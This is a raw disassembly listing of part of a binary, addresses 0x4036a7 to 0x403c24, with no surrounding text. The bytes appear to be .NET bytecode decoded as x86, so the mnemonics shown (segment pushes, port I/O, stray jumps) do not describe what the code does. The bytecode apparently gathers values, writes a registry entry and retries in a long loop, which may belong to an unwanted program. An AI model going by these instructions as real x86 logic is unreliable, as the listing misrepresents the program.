  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 8e             	es jb  0x403660
  4036d2:	24 00                	and    $0x0,%al
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	a0 24 00 70 28       	mov    0x28700024,%al
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 0a 22 00       	and    $0x220a72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 a6                	jb     0x403720
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 bc 24 00       	and    $0x24bc72,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 c6 24 00       	and    $0x24c672,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 d0 24 00       	and    $0x24d072,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 d6                	jb     0x4037a3
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 ea             	or     -0x16(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	ee                   	out    %al,(%dx)
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	f8                   	clc
  4037ef:	24 00                	and    $0x0,%al
  4037f1:	70 6f                	jo     0x403862
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 04             	or     0x4(%edx),%dh
  4037f9:	25 00 70 72 10       	and    $0x10727000,%eax
  4037fe:	25 00 70 6f 95       	and    $0x956f7000,%eax
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 1c 25 00       	and    $0x251c72,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 26 25 00       	and    $0x252672,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 36 25 00       	and    $0x253672,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 42             	or     0x42(%edx),%dh
  403859:	25 00 70 72 36       	and    $0x36727000,%eax
  40385e:	25 00 70 6f 95       	and    $0x956f7000,%eax
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 4c             	or     0x4c(%edx),%dh
  403868:	25 00 70 72 c6       	and    $0xc6727000,%eax
  40386d:	24 00                	and    $0x0,%al
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 58 25 00       	and    $0x255872,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 70 25 00       	and    $0x257072,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 82 25 00       	and    $0x258272,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 96 25 00       	and    $0x259672,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 aa 25 00       	and    $0x25aa72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 04                	jb     0x4038f9
  4038f5:	22 00                	and    (%eax),%al
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 b4 25 00       	and    $0x25b472,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 c0             	adc    %esi,-0x40(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 c6             	or     -0x3a(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 f2             	or     -0xe(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 30    	or     0x30720907,%cl
  4039dd:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4039e1:	83 00 00             	addl   $0x0,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 48                	jb     0x403a5e
  403a16:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  403a1a:	04 dd                	add    $0xdd,%al
  403a1c:	31 00                	xor    %eax,(%eax)
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	72 50                	jb     0x403a72
  403a22:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 48                	jb     0x403a8f
  403a47:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  403a4b:	04 dd                	add    $0xdd,%al
  403a4d:	00 00                	add    %al,(%eax)
  403a4f:	00 00                	add    %al,(%eax)
  403a51:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 04             	add    %dh,0x4(%edx)
  403b3e:	22 00                	and    (%eax),%al
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
